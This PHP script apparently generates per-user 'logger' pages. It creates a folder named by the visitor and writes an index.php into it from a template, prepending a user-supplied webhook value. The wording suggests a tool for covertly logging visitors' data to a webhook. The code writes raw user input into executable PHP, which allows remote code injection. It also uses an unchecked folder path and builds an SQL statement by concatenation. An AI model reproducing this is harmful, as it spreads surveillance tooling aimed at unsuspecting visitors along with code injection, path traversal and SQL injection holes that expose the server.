<?php
if ($_SERVER["REQUEST_METHOD"] === "POST") {
    $folder = $_POST['folder'];
    if(!is_dir($folder)){
    mkdir($folder);
    } else {
	die('Please don\'t try overwriting others\' loggers!');
    }
    $webhook = $_POST['webhook'];
    $id = rand(1302, 31424);
    
    $sql = "INSERT INTO loggers (id, webhook)
VALUES ($id, $webhook)";
mkdir($folder);
$code = file_get_contents("code.php");
$myfile = fopen("$folder/index.php", "w");
$txt = $code;
fwrite($myfile, '<?php $dual = "'.$webhook.'"; ?>'.$txt);
header("location: $folder/");
}
?>
